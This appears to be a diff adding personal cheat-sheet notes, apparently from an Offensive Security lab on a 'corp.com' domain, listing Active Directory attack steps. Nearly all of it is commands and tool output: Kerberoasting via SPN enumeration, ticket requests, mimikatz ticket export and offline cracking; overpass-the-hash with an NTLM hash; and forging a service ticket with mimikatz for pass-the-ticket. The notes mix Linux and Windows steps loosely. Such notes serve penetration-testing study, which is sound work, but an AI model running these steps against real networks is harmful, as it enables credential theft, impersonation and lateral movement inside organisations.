@@ -1,0 +1,53 @@
+#!/usr/bin/peno
+
+#Installing kerberoast
+sudo apt update && sudo apt install kerberoast
+
+
+#1- Listing serviceprincipalname with GetSPN
+Get-NetUser -SPN | select serviceprincipalname 
+
+#2- Requesting with the spn to get the hashes
+powershell-->
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
+
+
+#3- Exporting tickets from memory
+mimikatz-->
+kerberos::list /export
+Output:
+[00000001] - 0x00000017 - rc4_hmac_nt
+   Start/End/MaxRenew: 12/02/2018 10.18.31 ; 12/02/2018 20.17.53 ; 19/02/2018 10.17.53
+   Server Name       : HTTP/CorpWebServer.corp.com @ CORP.COM
+   Client Name       : Offsec @ CORP.COM
+   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
+   \* Saved to file     : 1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
+
+
+#4- Cracking the tickets
+python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
+
+
+#Over passing the hash
+
+mimikatz --> sekurlsa::logonpasswords -->
+mimikatz --> sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327  /run:PowerShell.exe
+
+
+#Pass the Ticket
+mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+
+mimikatz # kerberos::list
+
+mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+
+mimikatz # kerberos::list
+
+[00000000] - 0x00000017 - rc4_hmac_nt
+   Start/End/MaxRenew: 13/02/2018 10.18.42 ; 11/02/2028 10.18.42 ; 11/02/2028 10.18.42
+   Server Name       : HTTP/CorpWebServer.corp.com @ corp.com
+   Client Name       : offsec @ corp.com
+   Flags 40a00000    : pre_authent ; renewable ; forwardable ;
+
